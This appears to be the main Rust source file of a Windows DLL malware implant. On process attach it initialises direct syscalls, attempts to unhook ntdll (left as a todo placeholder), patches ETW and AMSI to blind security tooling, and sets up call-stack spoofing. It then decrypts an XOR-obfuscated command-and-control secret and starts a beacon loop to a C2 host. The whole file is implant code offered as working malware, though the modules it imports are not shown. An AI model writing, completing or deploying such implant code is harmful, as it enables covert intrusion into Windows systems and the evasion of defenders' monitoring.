pub mod core;

/** Debug output macro
 * This will always print in debug builds AND in release builds with verbose feature
 * */
#[macro_export]
macro_rules! debug {
    ($($arg:tt)*) => {
        #[cfg(any(debug_assertions, feature = "verbose"))]
        println!("[DEBUG] {}", format_args!($($arg)*));
    };
}

// Build time generated key
include!(concat!(env!("OUT_DIR"), "/xor_key.rs"));
// C2 Configuration
include!(concat!(env!("OUT_DIR"), "/c2_config.rs"));

#[unsafe(no_mangle)]
pub unsafe extern "system" fn DllMain(_instance: *mut ::core::ffi::c_void, reason: u32, _reserved: *mut ::core::ffi::c_void) -> i32 {
    if reason == 1 { // DLL_PROCESS_ATTACH
        beacon_entry();
    }
    1 // TRUE
}

unsafe fn beacon_entry() {
    use core::net::beacon;
    use core::{ssn_table, etw, amsi, spoof};
    if !ssn_table::initialize_syscalls(::core::ptr::null_mut()) {
        return;
    }

    let unhook_result: Option<usize> = todo!("Unhook ntdll");
    if let Some(n) = unhook_result {
        if n == 0 {
            debug!("[*] [UNHOOK] ntdll clean, no hooks found");
        } else {
            debug!("[*] [UNHOOK] Restored {} hokked bytes in ntdll", n);
            ssn_table::initialize_syscalls(::core::ptr::null_mut());
        }
    } else {
        debug!("[*] [UNHOOK] Failed, continuing with potentially hooked ntdll");
    }

    etw::patch_etw();
    amsi::patch_amsi();
    spoof::initialize_spoof_gadgets();

    if !ssn_table::initialize_network() {
        return;
}

    // Decrypt C2 secret and start beacon
    let c2_secret: Vec<u8> =  C2_SECRET_ENC.iter().enumerate().map(|(i, b)| b ^ XOR_KEY[i % XOR_KEY.len()]).collect();
    let c2_config: beacon::C2Config = beacon::C2Config {
        host: &C2_HOST,
        port: C2_PORT,
        use_https: C2_HTTPS,
        secret: &c2_secret,
        interval_ms: C2_INTERVAL,
        jitter_pct: C2_JITTER, 
    };

    beacon::beacon_loop(&c2_config);
}

extern crate alloc;
use alloc::vec::Vec;